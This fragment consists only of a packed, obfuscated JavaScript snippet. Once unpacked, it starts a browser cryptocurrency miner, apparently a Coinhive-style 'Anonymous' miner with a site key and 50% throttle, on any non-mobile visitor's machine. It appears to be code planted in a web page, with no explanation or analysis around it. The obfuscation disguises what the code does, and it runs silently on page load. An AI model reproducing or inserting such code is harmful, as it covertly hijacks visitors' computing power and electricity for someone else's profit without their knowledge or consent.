...
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('b 1=6 7$.4(\'2\',{3:0.5});a(!1.8()){1.9()}',12,12,'|miner|yU1texZNqNpeQ92CDHyA8cPyL24dQQVe|throttle|Anonymous||new|_|isMobile|start|if|var'.split('|'),0,{}))
